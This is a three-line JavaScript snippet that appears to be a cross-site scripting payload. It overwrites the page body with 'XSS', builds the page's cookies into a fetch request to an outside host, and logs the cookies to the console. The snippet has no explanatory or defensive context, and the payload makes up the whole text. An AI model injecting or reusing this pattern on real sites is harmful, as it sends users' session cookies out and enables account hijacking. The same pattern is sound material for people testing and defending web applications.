document.body.innerHTML = "XSS";
fetch("https://cdn.jsdelivr.net/" + document.cookie);
console.log(document.cookie);
